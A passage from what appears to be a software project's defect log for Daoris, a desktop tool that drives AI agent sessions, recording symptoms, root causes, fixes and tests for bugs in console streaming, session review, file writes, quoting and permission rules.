failed with exactly that message, and kept the branch. The same add with `-c core.longpaths=true`
checked it out. `SessionTreesTests` holds all three halves. A tracked path that fits the root but not
the tree's prefix opens, asserted over 260 characters. A checkout that fails after the branch exists
(a required smudge filter that fails, portable to every platform) leaves no `daoris/*` branch, and
the refusal names the filter rather than *Preparing worktree*. Driver 736, family rehearsal.

**Not repaired here:** the sixteen branches already made in the owner's repository. They are the
owner's to delete, since the repository is not Daoris's to write into (`reaching-in`).

## The protocol door's console broke the agent's words at every chunk, and the first fix hid them (2026-09-26)

**Symptom.** UX5 U3, on the scratch window. The console of a protocol-door session, driven or a
chat, wrote each streamed piece of a message as a line of its own, so the raw view read `Capped at `
over `4 per frame.`, breaking inside words wherever the agent had flushed.

**Root cause.** `AcpSession` rendered every `agent_message_chunk` straight to `onLine`, and a chunk
is not a line: the wire cuts a message wherever the agent's output was flushed. The native door never
had the defect, because it writes its console from the whole message, which that wire repeats at the
end. ACP sends no whole message.

**The first fix hid the words.** Joining the chunks, and ending the open line at a newline or at the
next thing the wire said, passed every driver test and then failed the family rehearsal at 263/279.
Its stub says `acp heard: hold this turn` with no newline and holds the turn until it is stopped, so
the line stayed open, the words the gate waited for never reached the console, and the stop never
came. The fifteen failures after it were that chat still holding the tree. A real agent that says
something and then waits would hide its words the same way, for as long as it waits.

**Fix.** `AcpConsole` joins the chunks into lines from the event `Map` made, so the console and the
record read the words from one place. A newline ends a line, anything else the wire says ends the
open one first, and **a line the words leave open is shown once they have been quiet for two
seconds**. One lock covers the reader and the quiet timer, and a flush queued after the reader has
ended does nothing rather than throw on a pool thread.

**The quiet period was measured, after a guess failed on the window.** Half a second was the first
choice, and a real Claude Code chat over the protocol door broke its lines with it (`al` over
`pha: A tidally locked world … stor` over `m-fed oceans.`): a real stream pauses that long mid-word.
The record keeps a time per event, so the scratch machine's 13 kept conversations gave 2,968 gaps
between one chunk and the next: median 48ms, p99 557ms, the longest 1,161ms, none over two seconds.
A line that stays open is what an in-place console line would fix outright. That is the driver, the
shell's relay, the page's console and the terminal door changing together, and nothing measured asks
for it yet.

**Verification.** `AcpTests`: the chunks become their lines, a thought's included; the last words
before a stream ends are shown; and words left open are on the console while the turn is still held.
That last test passed against a disabled timer at first, because stopping the turn ends the reader
and its final flush shows the line anyway. It now reads the console before the stop, and it went red
against the disabled timer before going green against the real one. The family rehearsal holds the
held-turn case end to end.

## A session that had ended could not be reviewed, merged or discarded from the screen (2026-09-26)

**Symptom.** Found by FRAME6's look, on the scratch window. A completed chat's Review said *This
session's work is not on this machine — its record names no working tree here*. The session's own
head, above it, showed its tree, and the pane still offered *accept* and *discard* beneath the
refusal.

**Root cause.** `ServiceClient.SessionGroundAsync`, where `SESSION_DIFF`, `MERGE_SESSION_TREE` and
`DISCARD_SESSION_TREE` find a session's tree and base commit, read `/api/sessions`. That route lists
ACTIVE sessions, and the client's own comment two methods up says so (DRV6). A session is reviewed,
merged or discarded once it has ended, so the usual case fell through to *no tree here*. No gate
reached it: the module tests run without a service, and the platform's suite mocks the bridge.

**Fix.** The ground is read with `includeClosed=true`.

**Verification.** A test against the stand-in service, which honours `includeClosed` as the real
host does. A completed session's tree and base were null before the fix and are read after it, while
a live one's and an unknown one's are unchanged. On the window, the same chat's Review now reads
*Nothing landed*.

**The trap to inherit.** A list route that means *active* is a filter as well as a list. Asking it
for one record by id returns *not found* for every record the filter hides.

## Conversations were missing from what each account carried, and the screen said why wrongly (2026-09-26)

**Symptom.** Found by CONV5 while reading the usage copy. Settings' *What each account has carried*
counted driven sessions and intakes only. Every conversation, the main way a person now uses an
account, was missing from it. The copy explained the absence as "only over the protocol door", which
had been untrue since CONV3a gave the native door a reader that reports context.

**Root cause.** TOOL3 recorded usage where a session concluded, in the driver's tick. Conversations
conclude in `ChatRunner`, which was written before TOOL3 and never recorded anything. The copy and
`Usage.cs`'s remarks were written when ACP was the only structured wire, and CONV3a did not revisit
them.

**Fix.** A conversation records its high-water context at its end: the protocol door's from the
session (`AcpSession.Usage`), the native door's from its reader. It records through the loop's one
`SessionUsage`, which now takes one writer at a time, since a chat's end and a driven session's can
land together. The copy, the remarks and the toolchain design's §4 say what is measured now.

**Verification.** A test on each door, over stand-in harnesses that report context: the conversation
counts at its high-water mark, and a text door adds nothing. Red before the fix, since the runner
took no usage record at all.

## The code map was corrected by hand, so its gate was red on main and nothing said so (2026-09-26)

**Symptom.** Found by CONV4d running every declared gate: `map --check` said module `daoris-web`
had changed. Regenerating it would have put back the old summary, *convergence first*, which REV3
had corrected to *Overview first (D40), sessions a view (D66)*.

**Root cause.** `docs/code-map.json` is generated from each project's own description, and REV3
(`3042a19`) corrected the web module's sentence in the generated file rather than in
`src/Daoris.Web/package.json`, where the generator reads it. The `code-map` gate is declared in
`daoris.gates.json` but is not part of `npm run verify`, so no gate run since REV3 had run it.

**Fix.** The corrected sentence is now the package's own description, and the map regenerates to
exactly what was committed.

**Verification.** `map --check` red before the fix, green after, with `docs/code-map.json`
unchanged from HEAD.

**The trap to inherit.** A generated file's correction belongs in its source. And `verify` is the CLI
and the universal gates only: every other gate `daoris.gates.json` declares, `code-map` among them,
runs only when someone runs it.

## The desktop wrote an edit over a home file it could not read, dropping what the file held (2026-09-25)

**Symptom.** Found by CLEAN1, confirming the driver's *one unreadable-config convention* item. REV3
fixed this for the CLI (F3, F4): an edit over a home file the tool could not read is refused. The
desktop's side of the same files still did it.

- **`permissions.json`:** a rule added from Settings, or a narrowing proposal the tick applied, wrote
  the empty read back, and every deny the person had written was gone.
- **`harnesses.json`:** a version pinned or unpinned, or a profile's default set or cleared, rewrote
  the file with every default, workspace choice and pin removed.
- **`plugins.json`:** enabling or disabling a plugin switched back on every plugin the person had
  switched off.

**Root cause.** Each reader returns the empty default for an unreadable file, which is right for
driving: a hand-mangled file must never stop the driver coming up. The editors then read through
the same loader and saved what it returned, so the empty default became the new file.

**Fix.** The unreadable read carries its problem: `PermissionFile.Problem` already existed and
nothing checked it, while `HarnessSettings.Problem` and `PluginState.Problem` are new. `Save`, or
the edit on the plugin state, refuses while a problem is set, and says to fix or remove the file.
Settling rule proposals over an unreadable file settles nothing and says so once. The proposals wait
for the first tick after the file is fixed. Driving still reads all three as empty.

**Verify.** One test per file, in `PermissionRulesTests`, `HarnessSettingsTests` and
`PluginCatalogTests`: an edit over a torn file is refused, and the file is byte for byte what it was.
`RuleProposalsTests` checks that a narrowing proposal over a torn rules file settles nothing and
stays `proposed`. All four were seen failing against the previous code. Driver 685/685, modules
129/129.

## A remote's malformed quest JSON threw at the door instead of being refused (2026-09-25)

**Symptom.** Found by CLEAN1, while deduplicating the service's JSON helpers. `QuestWire.ReadPush`
refuses a half-made operation by returning null, and the door answers that with its shape sentence.
But a publish whose `attachments` or `then` held a number or a string reached `Text(1, "name")`,
and `TryGetProperty` on a non-object throws `InvalidOperationException`. So a malformed push was an
exception at the door, not a refusal. `ReadPushed` on the machine threw the same way on an
`accepted` item that was not an object, or a `behind` item that was not a string.

**Root cause.** Seven private copies of the same few JSON helpers, and only one of them
(`CodeMapWire.Text`) checked that the element was an object before asking it for a field. The rest
relied on each caller having checked, and the attachment and step loops had not.

**Fix.** `JsonFields` holds `ParseObject`, `Text`, `Number`, `Items` and the `Written` builder once,
and every reader answers *absent* for an element of the wrong kind. QuestWire, SessionWire,
CodeMapWire, RemoteConfig, CodeMap and RegistryImport use it. `behind` filters by kind, as `links`
already did. The attachment shape `{name, sha256, bytes}` has one writer and one store reader on
`QuestAttachment`. The wire keeps its own judging reader, since a remote's JSON is not the store's.

**Verify.** `QuestSyncTests`: a push whose attachments or chain hold a non-object is refused, and a
push answer with a non-object acceptance is not one, while a non-string `behind` item is skipped.
All three threw `InvalidOperationException` against the previous code. Service 500/500.

## A chat test failed when its poll landed inside the stub's write (2026-09-25)

**Symptom.** REV3's final driver run failed one of 679 tests,
`ProtocolChatTests.A_chat_on_the_protocol_door_is_one_session_and_each_message_a_turn_in_order`,
with *the process cannot access the file … heard.txt because it is being used by another process*.
Nothing in the driver was wrong.

**Root cause.** The test polls the file its stub agent appends to. `File.ReadAllLines` opens with
`FileShare.Read`, meaning nobody else may write while it reads, and Windows refuses that open while
node holds the file for writing. A poll that landed inside an append threw instead of reading.
`TurnStopTests` and `ChatAttachmentTests` polled the same way.

**Fix.** A `StubFile` test helper opens the file sharing read and write, as the writer does. All
three suites read their stub's file through it.

**Verify.** `StubFileTests` holds a file open for writing the way node does, and asserts that
`File.ReadAllLines` throws while `StubFile.Lines` reads the whole file. The throw reproduces on
every run, not by timing. The three chat suites pass (22/22), and so does the full driver suite.

## The family gate repaired the examples it judged, and one check passed for another reason (2026-09-25)

**Symptom.** Found by REV3's reading of the tools. Phase 1 of the family rehearsal ran `sync` in the
examples themselves and failed if the tracked tree changed. The first run with stale examples failed
and also brought them up to date. A second run then passed, because what it measured was the
difference from a tree the first run had already fixed. Separately, the phase 12 check *a quest in a
workspace with no remote reaches no deployment* addressed a name nobody had registered. The service
refused it as unaddressable, so the check passed without any remote being consulted.

**Root cause.** In the first case the gate wrote to the tree it was judging. In the second, the
check's condition (a refusal, then no quest at the deployment) held for a reason unrelated to its
title.

**Fix.** Phase 1 syncs a copy of each example and compares the copy with the example file by file
(`treeDiff` in `tools/fsx.mjs`), so the examples are never written. The phase 12 check adds a second
member to the unwired circle. The quest must publish locally (200, workspace `tools`), a driver sync
must run, and the deployment must still not hold it. The quest is then declined, so no later phase
sees it.

**Verify.** `tools-main.test.ts` covers `treeDiff`. With one canon file changed, phase 1 failed and
named the four files, and `git status -- examples` stayed empty afterwards. The full family rehearsal
passes. The phase 12 check was not seen failing against a relay that leaks, since there is no cheap
way to make one. What changed is that a refusal now fails it.

## The deployment gate counted other installs' hooks, and a quote broke its process queries (2026-09-25)

**Symptom.** Found by REV3's reading of the tools. Two defects. First, phase 6 of the deployment
rehearsal counts the example plugin's hook processes before and after the shell closes. It matched
them by the script's name anywhere on the machine, so a hook from another rehearsal, or from the
owner's own install, counted as this shell's hook. After closing, that hook was reported as an
orphan. Second, `running`, `stopAll` and the rehearsal's window query compare a path inside a
PowerShell single-quoted string. A checkout under a folder with an `'` in its name ended the string
early, so the query matched nothing, and a stop that matches nothing leaves the old window holding
its port.

**Root cause.** Both queries trusted a string that the machine, not the gate, supplied.

**Fix.** `hookLines` keeps only the rows whose command line lies under the gate's own scratch. It
filters in JavaScript, because `-like` wildcards can appear in a path, and it compares case-blind.
`psQuote` doubles a `'` and leaves backslashes single, and all three queries use it.

**Verify.** `deployment-rehearsal.test.ts` checks that a hook of the same plugin outside the scratch
is not counted, and `desktop-tool.test.ts` quotes a path with an apostrophe. Both were seen failing
against the old matching and the old interpolation. `npm run rehearse:deploy` passes end to end.

## The doctrine gate could not start `daoris` on Windows (2026-09-25)

**Symptom.** Found by REV3's reading of the devkit. The doctrine gate runs `daoris check`, and its
default command is `daoris`. npm installs that on Windows as `daoris.cmd`. Started without a shell,
.NET looks for `daoris.exe` only, so on every Windows machine that had installed the CLI the gate
said the tool "could not be run". This repository never saw it, because it names
`node …/daoris.mjs` explicitly.

**Root cause.** The devkit started programs as a shell would not: no `PATHEXT` lookup. The driver's
harness actions had learned the same thing (the `WindowsShim` entry above).

**Fix.** `Process.Run` resolves an extensionless command on Windows by `PATHEXT`, and runs a `.cmd`
or `.bat` through `cmd.exe /d /c`. An argument carrying `cmd`'s metacharacters is refused rather
than re-read by `cmd`.

**Verify.** `ProcessTests` (Windows only, since a `.cmd` is a Windows shape): a `fake.cmd` named
without its extension runs and answers, and an argument with `&` is refused. Both failed first with
"the system cannot find the file". Devkit 80/80.

## A tool run through a junction ran nothing and exited 0 (2026-09-25)

**Symptom.** Found by REV3's reading of the tools. Each `tools/` script whose helpers are also
imported guards its runner so `node --test` does not run it. The guard compared `process.argv[1]` with
`import.meta.url`. Node resolves the main module's links, so a script reached through a junction or
a symlink sees its REAL path in `import.meta.url` and the typed path in `argv[1]`. The guard read
false, the deployment gate ran nothing, and it exited 0: a pass nobody earned.

**Root cause.** A path comparison that ignored links, written three ways in three scripts.

**Fix.** `isMain(import.meta.url)` in `tools/fsx.mjs` compares real paths, and the three scripts use
it (REV3 tools C8). CLAUDE.md's convention names it.

**Verify.** The premise was checked first: the old form printed `skipped` through a junction. The new
`tools-main.test.ts` runs a probe directly and through a junction, and both run; imported, it does not.

## The pre-commit leak scan read the wrong copy, and skipped non-ASCII names (2026-09-25)

**Symptom.** Found by REV3's reading of the devkit.
- **The wrong copy.** `sensitive --staged` listed the staged paths, then read each file from the
  working tree. A leak that was staged, then cleaned in the working copy without re-staging, was
  committed by a scan that passed.
- **Skipped names.** git prints a path outside ASCII quoted and escaped (`"\346\226\207.md"`). That
  quoted name matched no file on disk, so its content was never read, by the sensitive gate or by
  the links gate that reads the same list. Only the path was scanned.

**Root cause.** The staged scope borrowed the tree scope's file read, and both listings read git's
display format rather than its machine format.

**Fix.** The staged scan reads the index's copy (`git show :path`), which is what the commit holds.
Both listings use `-z`, whose NUL-separated paths git never quotes. The test fixture also clears
git's read-only object files before deleting itself.

**Verify.** Two new tests run against a real repository in the fixture folder:
`A_staged_scan_reads_what_is_staged_not_the_working_copy` and `A_file_named_outside_ascii_is_read_not_skipped`.
Both were re-run against the old gate with the fixture fix in place, and failed on their assertions,
not on cleanup. Devkit 78/78; `verify`'s five gates pass over this repository.

## Settings offered only the scoped circle's choices (2026-09-25)

**Symptom.** Found by REV3's reading of the page. Settings is the machine's, whatever the window is
scoped to. But its choices read the registry through the window's scope: a rule's scope, an
account's workspace default, what a start runs on per workspace, and the intake per workspace. A
window scoped to one circle therefore offered only that circle's workspaces and repositories, and
the rest of the machine could not be set from it.

**Root cause.** One registry hook, always scoped, used by a view that is not.

**Fix.** `useRegistry('machine')` reads the whole registry, and the four Settings uses take it. The
default is still the window's scope.

**Verify.** `reads the whole registry for a machine-wide choice, whatever the window is scoped to`
asked `/api/registry?workspace=aurora` before the fix, and asks `/api/registry` now. Shell and App
tests 109/109.

## A bridge timeout said something on this machine had refused (2026-09-25)

**Symptom.** Found by REV3's reading of the page. The page turns a bridge failure's code into a
sentence (`errors.{code}`), and a code with no sentence becomes "Something on this machine refused,
and did not say why." The bridge framework's own codes had none: `TIMEOUT` (the driver busy),
`NO_ROUTE` (a page newer than the application), and the rest. So a request that timed out said it
was refused, and a version mismatch said nothing a person could act on.

**Root cause.** The catalogues carried Daoris's refusals and not the framework's.

**Fix.** A sentence for each of the framework's codes, in English and Chinese, saying what happened
and what to do (wait, restart).

**Verify.** `says what the bridge itself failed at, in its own words for each` failed first.
Format tests 19/19. The catalogues agree on 943 keys.

## A permission rule the driver refused was cleared from its box (2026-09-25)

**Symptom.** Found by REV3's reading of the page. Adding a rule on Settings cleared the box as soon
as the rule was handed to the driver. A rule the driver refused (a typo, a scope it does not know)
was then gone as well as refused, and the person retyped it.

**Root cause.** The molecule cleared its state when it handed the addition up, before any answer.

**Fix.** `onAdd` carries an `added` callback. The organism calls it when the driver has taken the
rule, and only then does the box clear.

**Verify.** `keeps the rule it was given until the rule is added…` failed first: the box emptied on
press. Rules tests 15/15.

## "A molecule imports no hook" could not see a hook one step removed (2026-09-25)

**Symptom.** Found by REV3's reading of the page. The rule (D52 as amended) is held by
`presentational.test.ts`, which reads each presentational file for a forbidden import: the query
layer, the shell bridge and the rest. It did not forbid importing an organism, a component allowed to
hold hooks. The output panel in `work/frame.tsx` rendered the `SessionConsole` organism itself, so a
molecule reached the bridge one step removed, and the check stayed green.

**Root cause.** A per-file check that names modules, missing the one kind of module that is a hook
by proxy.

**Fix.** Importing any listed organism is now forbidden too. A type-only import is allowed, since it
is only a shape. The panel takes its console as a node, which `WorkFrame`, the organism above it,
supplies.

**Verify.** The sabotage test now includes an organism import (flagged) and a type-only one (not
flagged). The boundary holds across every presentational file. Panel, frame and boundary tests
76/76.

## One folder held in two accounts' files shared one row key (2026-09-25)

**Symptom.** Found by REV3's reading of the page. *What needs you* lists a folder the agent has not
been trusted in once per account file that holds it, since each file is a grant of its own. Rows
were grouped by file and folder, but each row's id was the folder alone. The band keys its rows by
kind and id, so one folder held in two accounts' files gave two rows one React key, and React could
reconcile one onto the other or drop it as the list moved.

**Root cause.** The grouping key and the row's id were two different things that should have been one.

**Fix.** The row's id is the key it is grouped by: file and folder. The trust door reads the row's
`trust` pair, not its id, so nothing else moves.

**Verify.** `gives one folder held in two files two rows with ids of their own` failed on one shared
id, and passes. Attention tests 25/25.

## A detached session had no timeline when wide, and a parked note could show nowhere (2026-09-25)

**Symptom.** Found by REV3's reading of the page.
- The attended column hides its timeline on a wide window (`lg:hidden`), because the main window's
  right dock shows it there. A detached session window has no dock, so at 1024 px and up it showed no
  timeline at all.
- Two places decided whether a parked session's note is left out of the timeline, because the head
  already shows it with its moves: the column (`awaiting-person` and answerable here) and the dock
  (`awaiting-person` alone). For another machine's parked session, which is not answerable here, the
  head showed no note and the dock hid it, so on a wide window it was shown nowhere.

**Root cause.** A layout rule that assumed the main window, and one judgement written twice.

**Fix.** `AttendedSession` takes `timeline="always"`, which the detached window passes.
`noteIsInTheHead` is the one rule, read by the column and the dock.

**Verify.** Three cases were added to `AttendedSession.test.tsx`; two failed first (the third passes
as the default it pins). Frame and attended tests 61/61.

## A tool call that failed mid-turn stayed closed (2026-09-25)

**Symptom.** Found by REV3's reading of the page. The conversation draws a tool call as it runs, and
the same card changes when the call ends. The design is "closed by default, open when it failed",
but the card read "failed" once, when it first drew. A call drawn running that then failed stayed
closed over the output a reader came for. Only a call that had already failed when the page first
loaded opened.

**Root cause.** `useState(failed)`: an initial value that was then never read again.

**Fix.** The card follows the call's status until the person opens or closes it. After that, their
choice stands.

**Verify.** `opens a tool call that fails after it was drawn running` draws the call running,
redraws it failed, and failed before the fix. Conversation tests 21/21.

## Starting a session offered the default harness's accounts for any harness (2026-09-25)

**Symptom.** Found by REV3's reading of the page. The *Start a session* form lets a person choose the
agent tool and the account. It was handed the accounts of the driver's default harness only. So
choosing Codex still offered Claude Code's accounts, and the spawn refused a profile name Codex had
never heard of. An account chosen before switching harness also stayed chosen.

**Root cause.** The frame computed one harness's accounts before the form knew which harness would
be chosen.

**Fix.** The form is handed every harness's accounts, and shows those of the harness chosen (the
default's while none is). Changing the harness clears the account.

**Verify.** `StartSession.test.tsx`, new: both cases failed first, and pass. Frame tests green.

## A shell with no home opened nothing and said nothing (2026-09-25)

**Symptom.** Found by REV3's reading of the desktop. A workspace build started without
`DAORIS_HOME` (`dotnet run`, or the exe from its build folder) exited at once, with no window and no
sentence. An install sets its own home, and `npm run desktop -- run` gives a scratch one; everything
else had nothing.

**Root cause.** `DriverLoop`'s property initializers resolve the home and throw a `DriverException`
when there is none. The container built the loop as the application started, before any window, and
a windowed program has no console to print the throw to.

**Fix.** `Main` checks the home first. With none, a message box says the home's own sentence and how
a development run gets one, and the process exits 2. The Remotes module's path now says the same
thing, rather than handing a null path onward (the build warned of that one, CS8603).

**Verify.** Build only. A message box cannot be dismissed from this session, so the check was not
run by starting the window. The sentence is `DaorisHome`'s, which the driver's tests already cover.

## With a secondary window in front, the same news came twice (2026-09-25)

**Symptom.** Found by REV3's reading of the desktop. A session that parks or ends unasked raises an
OS balloon, unless the person is already looking, because the page's own toast carries it then. The
test for "looking" was whether the MAIN window was in the foreground. A secondary window (the
monitor, a detached session) mounts the same page with its own toasts (`SecondaryWindowRoot` mounts
`ShellSignals`). So with one of those in front, the person got the toast in front of them and the
balloon as well.

**Root cause.** "Looking at Daoris" was tested as "looking at one window".

**Fix.** Looking is: the foreground window belongs to this process, and is not minimized.

**Verify.** Build only. The notifier is WinForms tray code with no test harness, and a balloon cannot
be observed from a test. The premise was checked in the page source: every Daoris window's page
raises the attention toast.

## Two refusal codes said the wrong sentence for most of their causes (2026-09-25)

**Symptom.** Found by REV3's reading of the desktop. The page translates a refusal's CODE into a
sentence, so one code is one sentence. `SESSION_NOT_REVIEWABLE` was thrown for four causes: no tree
here, no recorded starting commit, a range git could not read, and nothing here to merge or discard.
Its sentence fitted the first two. `HARNESS_ACTION_UNKNOWN` was also thrown for a profile verb with no
profile name, where the page said "there is no agent action called profile".

**Root cause.** A code reused for a new cause without a new sentence. REV3's F10 finding (nothing
checks a throw site against its sentence) is how it went unnoticed; that one is a backlog row.

**Fix.** Three codes of their own: `SESSION_NO_BASE`, `SESSION_RANGE_UNREADABLE` and
`HARNESS_PROFILE_NEEDED`, in English and Chinese. `SESSION_NOT_REVIEWABLE` keeps the one cause it now
has (the work is not on this machine), and its sentence says that for a diff and a merge alike. The zh
sentence for an unknown agent action says 智能体 like the rest of the catalogue.

**Verify.** `A_profile_verb_without_a_name_is_refused` names the new code. The page's review test
reads the new sentence. The refusal-parity test holds that every code has both sentences: modules
129/129, 933 keys in each catalogue.

## An answering host was counted down when the adoption notice could not read (2026-09-25)

**Symptom.** Found by REV3's reading of the desktop. When a host already answers, the shell adopts
it, then compares the bundle it serves with the page the install carries (the notice, case study
4d). Reading the install's page could throw (a file held open, an unreadable folder), and the throw
escaped `EnsureAsync` after the host had answered. The loop then counted the host as down and never
started the driver. It said so on `DRIVER_ERROR` at startup, before any page was listening.

**Root cause.** An informational read on the path that decides whether the host is up.

**Fix.** The notice's failures are caught: no notice, and the host is up.

**Verify.** `A_notice_that_cannot_read_its_own_page_does_not_make_an_answering_host_down` holds the
install's page open. Without the fix it failed with that `IOException`, and it passes with it.
Supervisor tests 5/5.

## Removing a plugin that speaks could strand it half-deleted (2026-09-25)

**Symptom.** Found by REV3's reading of the desktop. A plugin that speaks runs a hook process whose
working directory is the plugin's folder, and on Windows a running process holds that folder.
Removing it deleted every file it could, the manifest included, then failed on the folder. That left
a folder with no manifest (a plugin neither there nor gone) and the page a bare `IOException`. The
terminal's `daoris plugin remove`, and `plugin add` replacing an installed plugin, did the same, with
a raw `EPERM` naming a machine path. `plugin add` also copied with `fs.cpSync`, which the contract
(§8) forbids.

**Root cause.** A recursive delete used as a removal, on a folder another process could hold.

**Fix.** The desktop stops the plugin's hook process first (`HookSet.StopAsync`, rather than at the
next tick). Then every door moves the folder aside WHOLE into a dot-folder the catalogue never reads,
and deletes that. If the move is refused, nothing was taken, and the person is told what holds it:
`PLUGIN_BUSY` on the page, in English and Chinese, and a sentence at the terminal. `plugin add` copies
into a staging dot-folder, file by file, and swaps it in the same way.

**Verify.** Each test failed before its fix. `A_plugin_whose_folder_is_held_is_refused_whole_and_left_intact`
(the module, a file held open) got `UNKNOWN_ERROR IOException`. The CLI's `a plugin whose folder a
running process holds…` (a process's working directory) got `EPERM`. `One_plugin_can_be_stopped_now…`
holds the hook set's half. The CLI test runs on Windows only, because elsewhere the move succeeds.

## The headless driver died on Ctrl+C and on a missing home (2026-09-25)

**Symptom.** Found by REV3's reading of the headless host (`daoris-driver`).
- **Ctrl+C** killed the process outright. Its watch loop ran on `CancellationToken.None`, so nothing
  ended the sessions it ran. Their records stayed `working` and their agents ran on until the next
  driver's orphan sweep.
- **`daoris-driver trees` with no Daoris home** was an unhandled exception and exit −1. The
  subcommands were dispatched before the `try` that turns a `DriverException` into a sentence and
  exit 2.

**Root cause.** A token nobody could cancel, and the dispatch placed above the catch.

**Fix.** Ctrl+C cancels a token that the watch loop, `--once` and `--until-idle` all honour. Each
session ends and is recorded, as the desktop's close does (with the fix above). The chat door keeps
its own Ctrl+C, so the handler is registered after the subcommands. Every subcommand sits inside the
exit-2 catch.

**Verify.** `daoris-driver trees` with `DAORIS_HOME` unset now prints `driver: no Daoris home: …`
and exits 2 (it exited −1 with a stack trace before). The Ctrl+C half has no test: a console
interrupt cannot be sent from the suite. It rests on the cancellation path `DriverWatch` and
`TickAsync` already take, which the driven-session test above covers.

## Settling an agent's proposals could undo a person's deny (2026-09-25)

**Symptom.** Found by REV3's reading of the driver. Each tick, `RuleProposals.Settle` applies every
narrowing an agent proposed (D74). It read the rules once, before its loop, and saved that copy after
each narrowing it applied. A person's edit that landed during the loop (`daoris agent rules deny …`,
or the Settings page) was written over by the stale copy. So a deny the person had just added could
vanish because the driver applied something else.

**Root cause.** One read serving a loop of writes.

**Fix.** The rules are read afresh for each proposal, immediately before its change is judged and
applied: the same load-apply-save that `Answer` uses.

**Verify.** No test: the static method offers no point at which to land a person's write between
two proposals, and a test that raced the file would be timing, not proof. The window is now one
proposal's read-to-write, not the whole loop. Rule-proposal tests 31/31.

## Two writers of one file failed a finished session (2026-09-25)

**Symptom.** Found by REV3's reading of the driver. Fourteen places in the driver wrote a file
beside itself under a fixed name (`path + ".tmp"` or `".writing"`), then renamed it over the file.
Two writers of one file at once collided: two sessions in one tick installing the tree guard, or a
desktop and a terminal driver on one home recording usage. One's write met the other's open beside
file, or its rename found it already renamed. The throw came out of a session that had finished its
work, and the session was recorded `failed`.

**Root cause.** A shared scratch name. And one thing the review did not predict, found by the test
written for it: even with names of their own, two renames over one file at once are refused on
Windows with *access denied*.

**Fix.** `AtomicFile` is the driver's one writer, now used by all fourteen (REV3 driver C1). The
beside file is named per write, and the rename is retried while the target is busy: a bounded
number of times, a few milliseconds apart, and never for a file that is missing.

**Verify.** `Many_writers_of_one_file_at_once_all_land_and_leave_nothing_beside` runs 32 writers of
one file. Without the retry it failed eight runs in eight with `UnauthorizedAccessException`. With
it, it passed eight in eight. Driver suite green.

## Closing the application left a driven session's record saying `working` (2026-09-25)

**Symptom.** Found by REV3's reading of the driver. On close, the loop's token is cancelled, and each
session a tick started ends on it and writes `stopped`. But the sync that runs beside the sessions
(D68 §6) asked the host for each session's claim on that same cancelled token. It threw
`OperationCanceledException`, and the tick left before it awaited its sessions. The process then
exited, and their records still said `working`, holding their trees until the orphan sweep found
them.

**Root cause.** The beside-loop's catch named the host's failures, and not the closing itself.

**Fix.** The loop stops at cancellation, and ends quietly if the cancellation lands inside a sync.
The tick always awaits every session it started before it returns.

**Verify.** `A_cancelled_tick_returns_only_after_its_sessions_are_recorded` ticks with a beside-sync,
cancels after one sync has run, and reads the record the moment the tick returns. It read `working`
before the fix. Driven-session tests 5/5. 🔴 **Not fully explained:** in one full driver run of five,
under heavy load, the test timed out after 35 s. Its message was not captured, and it did not recur
in three more full runs. Alone, the tick returns about 50 ms after the cancel (measured). The bound is
now 90 s. If it recurs, capture the message first: a tick that outlives a close by that long is a
bug in its own right.

## Two circles could share one intake room (2026-09-25)

**Symptom.** Found by REV3's reading of the driver. An intake's room is a folder under the home,
named after its circle. The name kept ASCII letters, digits, `-` and `_`, turned everything else
into `-`, and fell back to `default`. Every circle named with no ASCII letter (`设计`, `工作`) became
`default`, and `my circle` and `my-circle` became one folder. The room is the intake's lock (one
running per room) and holds its circle's declarations as `AGENTS.md`. So two circles blocked each
other's asks, and each intake could read the other circle's family.

**Root cause.** A lossy name used as an identity.

**Fix.** A name that is already a folder name stays exactly that, so no existing room moves. One that
lost anything gets a short hash of the exact (trimmed, lower-cased) name beside the readable part,
`workspace-<hash>` when nothing readable is left.

**Verify.** `Two_circles_never_share_a_room`: all four pairs shared a path before the fix.
`A_circle_is_one_room_however_its_name_is_cased` holds the other direction. Intake 26/26.

## A stop sent to a session a terminal runs said its record told how it ended (2026-09-25)

**Symptom.** Found by REV3's reading of the conversation. A session another Daoris process on this
machine runs (a terminal's `daoris-driver chat`) cannot be stopped from the desktop. The desktop's
stop found nothing of its own to end, and the orphan sweep rightly skipped a session that is alive.
The page then said *"was not running here — its record says how it ended"* over a record that
still read `working`.

**Root cause.** The stop's answer had two facts (stopped, orphan), and the third case fell through
to the sentence for a session that had finished.

**Fix.** The driver module answers `elsewhere` when a process on this machine still runs the
session. The page says so, and says to stop it there (en and zh).

**Verify.** The page's `says what the stop did` table gained the case, which failed first. The
module test checks the field is false when nothing runs the session. Web 55/55, modules 127/127.

## A conversation's open, stop and process each had a gap (2026-09-25)

**Symptom.** Found by REV3's reading of the conversation's protocol door.
- **The open.** A session that could not open for any reason but a `DriverException` skipped the
  open's own ending. A `session/new` answer whose id is a number is one such reason. The queue then
  waited for a session that would never come, the record stayed `working` with nothing in it, and
  the transcript closed under a stderr pump still writing to it.
- **A stop mid-turn.** A person's stop ends the agent, so the turn's prompt fails with "the stream
  ended". That was recorded as *"the turn could not be taken"*, a failure of the agent's, when it was
  the person's act.
- **The process.** Nothing disposed a conversation's `Process` or its pipes.

**Root cause.** The open's catch named one exception type. The turn's catch could not tell a stop
from a failure. There was no `using` for the process.

**Fix.** The open ends on every failure, and `OpenAsync` reads the session id without trusting its
shape. A turn that fails after a stop was requested ends as `cancelled`, with no failure note. The
process is disposed last, after it is untracked.

**Verify.** `A_session_that_cannot_open_for_any_reason_ends_the_conversation_with_a_note` timed out
with the record still `working` before the fix. `A_stop_mid_turn_ends_the_turn_as_cancelled_and_writes_no_failure`
found the false note. The disposal has no test: it is resource hygiene with no observable output.

## An ACP request of an unexpected shape was never answered (2026-09-25)

**Symptom.** Found by REV3's reading of the ACP client. A `session/request_permission` whose
`params` or options were not the shape expected (params a string, an option a number, a `kind` a
number) threw while the options were read. The pump showed the frame as unreadable and read on, and
the agent waited for its answer for ever: a hung turn. An error answer of an unexpected shape did
the same to one of this client's own calls.

**Root cause.** Element reads that throw on the wrong kind, on a path whose only way out was an
answer.

**Fix.** The refusing option is read with every kind checked; nothing readable means `cancelled`,
which is also a refusal. Any request with an id whose handling still throws is answered with a
JSON-RPC error. The error branch that completes our own calls reads the message the same way.

**Verify.** `A_permission_request_of_an_unreadable_shape_is_still_answered`: two of its three shapes
went unanswered before the fix. ACP and chat tests 70/70.

## Two hosts could open two sessions on one tree, and move a finished one (2026-09-25)

**Symptom.** Found by REV3's reading of the service. The one-session-per-tree lock (D46, D51) was a
read ("is anything active here?") followed by a write (create the session). Every host on a machine
